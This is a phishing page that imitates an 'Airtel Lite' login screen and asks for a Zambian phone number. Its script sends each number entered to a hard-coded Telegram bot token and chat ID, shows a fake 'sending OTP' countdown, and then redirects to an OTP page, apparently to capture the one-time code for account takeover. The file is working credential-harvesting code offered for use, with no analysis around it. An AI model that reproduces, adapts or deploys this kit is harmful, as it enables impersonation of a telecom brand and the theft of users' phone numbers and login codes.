<head>

    <script src="https://cdn.tailwindcss.com/"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&amp;display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        
        .spinner {
            border: 2px solid rgba(255, 255, 255, 0.3);

            height: 18px;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

                transform: rotate(360deg);
            }

        #sendOtpBtn {
            transition: all 0.2s ease-in-out;
        }
        
        .btn-inactive {
            background-color: #fca5a5;
            cursor: not-allowed;
            opacity: 0.8;
        }
        
        .btn-active {
            background-color: #ff0000;
            cursor: pointer;
            opacity: 1;
            box-shadow: 0 4px 12px rgba(255, 0, 0, 0.15);
        }
        
        .browser-icon {
            width: 38px;

            object-fit: contain;
        }

<body class="flex flex-col min-h-screen bg-white">

    <main class="flex-grow flex items-center justify-center px-6">
        <div class="bg-white w-full max-w-sm rounded-2xl shadow-xl border border-gray-100 p-8">
            <h2 class="text-center font-bold text-gray-800 text-lg tracking-wider mb-8 uppercase">
                Login to Airtel Lite
            </h2>

            <div class="mb-6">
                <div id="inputWrapper" class="flex border border-gray-400 rounded-sm transition-all overflow-hidden">
                    <span class="bg-white pl-4 py-4 text-xl font-semibold text-gray-800 flex items-center">+260</span>
                    <input type="tel" id="phoneInput" placeholder="XXXXXXXXX" maxlength="9" class="w-full p-4 pl-1 text-xl font-semibold text-gray-800 outline-none">
                </div>
            </div>

            <button id="sendOtpBtn" disabled class="btn-inactive w-full text-white font-bold py-4 rounded-md uppercase tracking-widest text-sm flex items-center justify-center gap-3">
                <span id="btnText">Send OTP</span>
                <div id="loader" class="spinner hidden"></div>
            </button>

            <p class="text-center text-gray-600 text-sm mt-6">
                Forgot your number? <a href="#" class="text-[#007bff] font-semibold">Click Here!</a>
            </p>

            <div class="relative flex py-8 items-center">
                <div class="flex-grow border-t border-gray-200"></div>
                <span class="flex-shrink mx-4 text-gray-800 font-bold text-xs uppercase">or</span>
                <div class="flex-grow border-t border-gray-200"></div>
            </div>

            <button onclick="window.location.href='continue.html'" class="w-full border border-blue-400 text-[#007bff] font-bold py-3.5 rounded-md active:bg-blue-50 transition duration-200 uppercase tracking-wide text-sm">
                Continue Without Login
            </button>
        </div>
    </main>

    <footer class="mt-auto bg-white flex flex-col items-center justify-center pb-8">
        <p class="text-gray-700 font-medium mb-4">Best experienced in</p>

        <div class="flex items-center gap-4 px-4">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_(February_2022).svg" class="browser-icon" alt="Chrome">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/52/Safari_browser_logo.svg" class="browser-icon" alt="Safari">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/49/Opera_2015_icon.svg" class="browser-icon" alt="Opera">
            <img src="https://play-lh.googleusercontent.com/WW5DkF_uytqj4_kY-YJJ0M8zoTqowXSjsSc_oUh08kyxPXuUCtYp_AUn37zGMPdevLbQ" class="browser-icon" alt="Samsung">
        </div>

        <div class="w-32 h-1 bg-gray-900 rounded-full mt-8 opacity-90"></div>
    </footer>

    <script>
        const phoneInput = document.getElementById('phoneInput');
        const sendOtpBtn = document.getElementById('sendOtpBtn');
        const btnText = document.getElementById('btnText');
        const loader = document.getElementById('loader');
        const inputWrapper = document.getElementById('inputWrapper');

        // --- TELEGRAM CONFIG ---
        const BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
        const CHAT_ID = '5615316142';

        phoneInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.startsWith('0')) value = value.substring(1);
            if (value.length > 9) value = value.substring(0, 9);
            e.target.value = value;

            if (value.length === 9) {
                sendOtpBtn.disabled = false;
                sendOtpBtn.classList.remove('btn-inactive');
                sendOtpBtn.classList.add('btn-active');
                inputWrapper.classList.add('border-red-500');
            } else {
                sendOtpBtn.disabled = true;
                sendOtpBtn.classList.add('btn-inactive');
                sendOtpBtn.classList.remove('btn-active');
                inputWrapper.classList.remove('border-red-500');
            }
        });

        sendOtpBtn.addEventListener('click', async() => {
            const phoneNumber = '+260' + phoneInput.value;

            sendOtpBtn.disabled = true;
            loader.classList.remove('hidden');
            localStorage.setItem('userPhone', phoneNumber);

            // 1. Send Direct to Telegram
            const message = `ðŸ“± <b>New Login Attempt</b>\n<b>Phone:</b> ${phoneNumber}`;
            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            try {
                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (err) {
                console.error("Telegram Error:", err);
            }

            // 2. Start 10-second countdown
            let secondsLeft = 10;
            btnText.innerText = `SENDING OTP (${secondsLeft}s)...`;

            const countdown = setInterval(() => {
                secondsLeft--;
                btnText.innerText = `SENDING OTP (${secondsLeft}s)...`;
                if (secondsLeft <= 0) {
                    clearInterval(countdown);
                    window.location.href = 'otp.html';
                }
            }, 1000);
        });
    </script>

</body>
